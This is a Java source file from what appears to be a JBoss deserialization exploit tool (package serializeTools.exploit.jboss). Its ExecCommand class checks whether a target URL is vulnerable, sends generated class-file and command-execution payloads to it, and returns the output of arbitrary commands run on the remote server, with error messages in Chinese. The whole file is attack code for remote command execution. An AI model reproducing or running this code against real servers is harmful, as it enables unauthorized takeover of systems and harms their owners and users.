package serializeTools.exploit.jboss;

import serializeTools.exploit.jboss.SendPayload;

public class ExecCommand  {
	
	public String execCommand(String targetUrl, String encoding, String commands) throws Exception {
		
		String OS = "linux";
		byte[] result = null;
		byte[] payload = null;
		
		SendPayload sp = SendPayload.getInstance();
		GenCommadExecPayload gcep = new GenCommadExecPayload();
		GenClassFilePayload gcfp = new GenClassFilePayload();
		TrimCommandRes tcr = new TrimCommandRes();


		String chechResult = CheckVul.getInstance().isVulnerable(targetUrl, encoding);
		if (chechResult.indexOf("200|Vulnerable") >= 0) {			
			try {
				
				payload = gcfp.genClassFilePayload(OS);
				result = sp.sendPayloadAndGetResponse(targetUrl, payload);
				try{
					tcr.getObject(result);
				}catch (Exception e){
					return "返回数据解析失败4";
				}
			}catch (Exception e){
				return "网络连接失败:" + e.getMessage();
			}

			try {
				payload = gcep.genCommadExecPayload(OS, commands);
				result = sp.sendPayloadAndGetResponse(targetUrl, payload);
				try{
					tcr.getObject(result);
				}catch (Exception e){
					return "返回数据解析失败4";
				}
			
			}catch (Exception e){
				return "网络连接失败:" + e.getMessage();
			}
		}else{
			try {
				payload = gcep.genCommadExecPayload(OS, commands);
				result = sp.sendPayloadAndGetResponse(targetUrl, payload);
				try{
					tcr.getObject(result);
				}catch (Exception e){
					return "返回数据解析失败4";
				}
			}catch (Exception e){
				return "网络连接失败:" + e.getMessage();
			}
			
		}
		String cmdResult = tcr.getCommandResult(result);
		return cmdResult;
	}

}
